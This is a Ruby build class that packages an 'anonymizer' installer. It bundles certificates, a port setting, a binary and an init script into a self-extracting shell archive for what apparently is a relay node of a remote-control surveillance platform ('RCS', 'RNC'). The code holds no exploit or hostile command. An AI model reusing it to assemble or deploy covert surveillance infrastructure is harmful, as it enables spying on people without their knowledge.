#
# Anonymizer installer creation
#

# from RCS::Common
require 'rcs-common/trace'

require 'archive/tar/minitar'

module RCS
module DB

class BuildAnon < Build
  include Archive::Tar

  def initialize
    super
    @platform = 'anon'
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    # take the files needed for the communication with RNC
    Dir.mkdir path('rcsanon/etc')
    FileUtils.cp Config.instance.cert('rcs.pem'), path('rcsanon/etc/certificate')
    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('rcsanon/etc/signature')

    # the local port to listen on
    File.open(path('managerport'), 'wb') {|f| f.write params['port']}
    
    # create the installer tar gz
    begin
      gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
      output = Minitar::Output.new(gz)

      h = {name: path('rcsanon/etc/certificate'), as: 'rcsanon/etc/certificate'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/etc/signature'), as: 'rcsanon/etc/signature'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/rcsanon'), as: 'rcsanon/rcsanon', mode: 0755}
      Minitar::pack_file(h, output)

      h = {name: path('version'), as: 'rcsanon/etc/version'}
      Minitar::pack_file(h, output)

      h = {name: path('managerport'), as: 'rcsanon/etc/managerport'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/init.d/rcsanon'), as: 'rcsanon/init.d/rcsanon', mode: 0755}
      Minitar::pack_file(h, output)

    ensure
      output.close
    end

    # prepend the install script
    sh = File.open(path('install.sh'), 'rb+') {|f| f.read}
    bin = File.open(path('install.tar.gz'), 'rb+') {|f| f.read}

    File.open(path('rcsanon-install'), 'wb') do |f|
      f.write sh
      f.write bin
    end

    @outputs = ['rcsanon-install']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
